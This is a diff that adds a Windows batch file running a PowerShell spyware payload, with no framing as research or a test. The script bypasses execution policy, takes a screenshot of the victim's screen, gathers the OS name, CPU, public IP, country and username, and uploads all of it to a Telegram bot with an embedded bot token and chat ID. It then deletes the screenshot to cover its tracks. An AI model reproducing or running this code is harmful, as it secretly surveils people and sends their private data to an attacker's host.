@@ -1,0 +1,22 @@
+@echo off
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+"$t='8790522530:AAFvxooJkDDVeMqu1hAZ7xUr4QapikChHFg'; $c='-1003394778998'; ^
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing,System.Net.Http; ^
+$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; ^
+$m=New-Object System.Drawing.Bitmap($b.Width,$b.Height); ^
+$g=[System.Drawing.Graphics]::FromImage($m); ^
+$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size); ^
+$f=\"$env:TEMP\s.jpg\"; $m.Save($f,[System.Drawing.Imaging.ImageFormat]::Jpeg); ^
+$m.Dispose(); $g.Dispose(); ^
+$os=(Get-ItemPropertyValue 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' 'ProductName'); ^
+$cpu=(Get-ItemPropertyValue 'HKLM:\HARDWARE\DESCRIPTION\System\CentralProcessor\0' 'ProcessorNameString'); ^
+$ip=(Invoke-RestMethod 'ipinfo.io/json'); ^
+$r=\"==== SYSTEM INFO ====`n[+] OS: $os`n[+] CPU: $cpu`n[+] IP: $($ip.ip) ($($ip.country))`n[+] User: $env:USERNAME`n[+] Date: $(Get-Date)\"; ^
+$http=New-Object System.Net.Http.HttpClient; ^
+$cont=New-Object System.Net.Http.MultipartFormDataContent; ^
+$cont.Add((New-Object System.Net.Http.StringContent($c)),'chat_id'); ^
+$cont.Add((New-Object System.Net.Http.StringContent($r)),'caption'); ^
+$fs=[System.IO.File]::OpenRead($f); ^
+$cont.Add((New-Object System.Net.Http.StreamContent($fs)),'photo','s.jpg'); ^
+$res=$http.PostAsync(\"https://api.telegram.org/bot$t/sendPhoto\",$cont).Result; ^
+$fs.Close(); del $f"
